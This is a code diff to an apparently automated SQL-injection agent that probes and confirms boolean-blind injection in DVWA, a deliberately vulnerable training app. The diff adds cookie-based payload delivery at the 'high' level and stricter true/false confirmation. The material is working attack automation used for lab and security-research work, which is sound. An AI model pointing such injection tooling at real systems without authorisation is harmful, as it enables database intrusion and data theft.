@@ -4,34 +4,30 @@ from __future__ import annotations
 
 import logging
 from typing import Any
+from urllib.parse import quote
 
 from agents.agent_telemetry import exploit_event, probe_event, score_event
 from agents.state_utils import already_tried_payloads, candidate_payloads_for_stage, chain_check as _chain_check, make_update, normalize_security_level
 from core.state import ExploitationState, MODULE_TO_KG_NODE
 from foundation.payload_library import PayloadLibrary
 from foundation.session_manager import DVWASession
-from foundation.verifier import Verifier
+from foundation.verifier import complementary_boolean_payload, usable_blind_response
 
 logger = logging.getLogger(__name__)
 
 AGENT_ID = "sqli_boolean_blind"
 MODULE_PATH = "/vulnerabilities/sqli_blind/"
-SESSION_INPUT_PATH = "/vulnerabilities/sqli/session-input.php"
-HIGH_RESULT_PATH = "/vulnerabilities/sqli/"
+HIGH_RESULT_PATH = MODULE_PATH
 _PROBE_OBSERVATION_KEY = "response_diff_detectable"
 
 _TRUTHY_SIGNAL = "user id exists in the database"
 _FALSY_SIGNAL = "user id is missing from the database"
-# NOTE: The falsy signal above is English-text dependent. The probe already
-# uses a length-difference fallback (abs(len(truthy) - len(falsy)) > 5)
-# which works regardless of language/localization.
-_EXPLOIT_SIGNALS = ["user id exists", "exists in the database", "admin", "password"]
 
 
-def _request_high_via_session(session: DVWASession, payload: str):
-    """Store a high-level payload, then reload the page that renders results."""
-    session.post(SESSION_INPUT_PATH, data={"id": payload})
-    return session.get(HIGH_RESULT_PATH)
+def _request_high_via_cookie(session: DVWASession, payload: str):
+    """DVWA's high blind module reads id from a cookie, not the SQLi session."""
+    session.http.set_cookie("id", quote(payload, safe=""))
+    return session.get(MODULE_PATH)
 
 
 def _request(session: DVWASession, security_level: str, payload: str):
@@ -40,7 +36,7 @@ def _request(session: DVWASession, security_level: str, payload: str):
     if security_level == "medium":
         return session.post(MODULE_PATH, data=request_data)
     if security_level == "high":
-        return _request_high_via_session(session, payload)
+        return _request_high_via_cookie(session, payload)
     return session.get(MODULE_PATH, params=request_data)
 
 
@@ -69,16 +65,14 @@ def _probe_preconditions(
         tried.append(payload)
         try:
             resp = _request(session, security_level, payload)
-            events.append(probe_event(AGENT_ID, payload, resp.status_code, True))
+            usable = usable_blind_response(resp, allow_missing="1=2" in payload)
+            events.append(probe_event(AGENT_ID, payload, resp.status_code, usable))
+            if not usable:
+                continue
             lower_text = resp.text.lower()
             if "1=1" in payload:
                 truthy_resp = lower_text
             elif "1=2" in payload:
-                falsy_resp = lower_text
-            # DVWA low: truthy shows "exists", falsy shows "missing"
-            if _TRUTHY_SIGNAL in lower_text:
-                truthy_resp = lower_text
-            elif _FALSY_SIGNAL in lower_text:
                 falsy_resp = lower_text
         except Exception as exc:
             logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
@@ -86,11 +80,8 @@ def _probe_preconditions(
 
     # Detect difference between truthy and falsy responses
     if truthy_resp is not None and falsy_resp is not None:
-        if truthy_resp != falsy_resp:
-            observations[_PROBE_OBSERVATION_KEY] = True
-            return True, tried, observations, events
-        # Even if same text, check for length difference
-        if abs(len(truthy_resp) - len(falsy_resp)) > 5:
+        if (_TRUTHY_SIGNAL in truthy_resp and _FALSY_SIGNAL not in truthy_resp
+                and _FALSY_SIGNAL in falsy_resp and _TRUTHY_SIGNAL not in falsy_resp):
             observations[_PROBE_OBSERVATION_KEY] = True
             return True, tried, observations, events
 
@@ -112,8 +103,18 @@ def _attempt_exploit(
     events: list[dict] = []
     confirmed: list[str] = []
     score = 0
-    true_conditions = 0
+    repeatable_conditions = 0
     required_confirms = 1 if security_level == "medium" else 2
+
+    def branch(response):
+        if not usable_blind_response(response, allow_missing=True):
+            return None
+        body = response.text.lower()
+        if _TRUTHY_SIGNAL in body and _FALSY_SIGNAL not in body:
+            return True
+        if _FALSY_SIGNAL in body and _TRUTHY_SIGNAL not in body:
+            return False
+        return None
 
     for payload in payloads:
         if payload in already_tried:
@@ -121,21 +122,41 @@ def _attempt_exploit(
         tried.append(payload)
         try:
             resp = _request(session, security_level, payload)
-            events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))
-            if resp.status_code == 200:
-                lower_text = resp.text.lower()
-                # Medium's filtered rendering collapses distinct predicate
-                # responses, so one true condition is the available evidence.
-                # High keeps the stricter two-condition confirmation.
-                if _TRUTHY_SIGNAL in lower_text:
-                    true_conditions += 1
-                    if true_conditions >= required_confirms:
-                        score = max(score, 3)
-                        confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
-                        break
-                # Partial: page renders without error
-                if "user id" in lower_text:
-                    score = max(score, 2)
+            observed = branch(resp)
+            event = exploit_event(AGENT_ID, payload, resp.status_code, observed is True)
+            events.append(event)
+            if observed is None:
+                continue
+            if observed is False:
+                # DVWA suppresses SQL exceptions into the same missing-ID body.
+                # Negating this expression must produce a true branch before
+                # its false result can receive any extraction credit.
+                control_payload = complementary_boolean_payload(payload)
+                if control_payload is None:
+                    continue
+                try:
+                    control = _request(session, security_level, control_payload)
+                except Exception as exc:
+                    logger.warning("[%s] Complementary control failed: %s", AGENT_ID, exc)
+                    events.append(probe_event(AGENT_ID, control_payload, None, False))
+                    continue
+                evaluates = branch(control) is True
+                events.append(probe_event(AGENT_ID, control_payload, control.status_code, evaluates))
+                if not evaluates:
+                    continue
+                event['payload']['success'] = True
+                event['status'] = 'ok'
+            score = max(score, 2)
+            # An evaluated branch carries information only if it repeats.
+            repeated = _request(session, security_level, payload)
+            consistent = branch(repeated) is observed
+            events.append(exploit_event(AGENT_ID, payload, repeated.status_code, consistent))
+            if consistent:
+                repeatable_conditions += 1
+                if repeatable_conditions >= required_confirms:
+                    score = 3
+                    confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
+                    break
         except Exception as exc:
             logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
             events.append(exploit_event(AGENT_ID, payload, None, False))
